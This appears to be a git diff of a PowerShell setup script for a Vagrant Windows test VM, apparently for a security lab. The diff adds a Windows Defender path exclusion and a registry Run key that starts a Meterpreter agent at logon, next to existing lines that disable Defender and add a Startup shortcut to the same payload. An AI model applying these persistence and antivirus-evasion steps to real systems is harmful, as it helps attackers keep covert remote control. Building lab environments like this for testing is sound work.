@@ -19,6 +19,8 @@ powercfg.exe /SETACTIVE SCHEME_CURRENT
 
 Write-Output "[*] Screen Timeout extended"
 
+Set-MpPreference -ExclusionPath C:\Users\vagrant\vagrant_data
+
 cd C:\Users\vagrant\vagrant_data
 Set-ExecutionPolicy Unrestricted -Force
 
@@ -36,6 +38,9 @@ Unblock-File disable-defender.ps1
 .\disable-defender.ps1
 
 # Launch Meterpreter at start up
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "Meterpreter-Agent" `
+    -Value "C:\Users\vagrant\vagrant_data\meterpreter-0.exe"
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("C:\Users\vagrant\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\meterpreter-0.lnk")
 $Shortcut.TargetPath = "C:\Users\vagrant\vagrant_data\meterpreter-0.exe"
